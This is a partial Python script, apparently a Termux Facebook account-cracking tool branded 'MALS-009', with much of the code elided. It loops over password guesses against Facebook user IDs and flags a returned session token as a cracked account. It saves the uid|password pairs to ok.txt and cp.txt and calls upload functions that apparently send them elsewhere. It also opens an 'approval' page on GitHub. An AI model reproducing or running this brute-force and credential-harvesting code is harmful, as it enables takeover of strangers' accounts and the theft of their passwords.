...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/MALS-009/approval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK :  ASHIK MAL'S")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰MALS-009")
...
___       ___      _     ____    68b  ____   
`MMb     dMM'     dM.    `MM'    Y89 6MMMMb\ 
 MMM.   ,PMM     ,MMb     MM      9 6M'    ` 
 M`Mb   d'MM     d'YM.    MM     /  MM       
 M YM. ,P MM    ,P `Mb    MM        YM.      
 M `Mb d' MM    d'  YM.   MM         YMMMMb  
 M  YM.P  MM   ,P   `Mb   MM             `Mb 
 M  `Mb'  MM   d'    YM.  MM              MM 
 M   YP   MM  ,MMMMMMMMb  MM              MM 
 M   `'   MM  d'      YM. MM    /   L    ,M9 
_M_      _MM_dM_     _dMM_MMMMMMM   MYMMMM9  
\033[1;90m══════════════════════════════════════════════════
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : MALS-009
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MALS-009_OLD] : %s/%s -> \033[0;92m [ MALS-009-OK:%s ]- \033[0;91m[MALS-009-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[MALS-009-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [MALS-009-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[MALS-009-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MALS-009-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
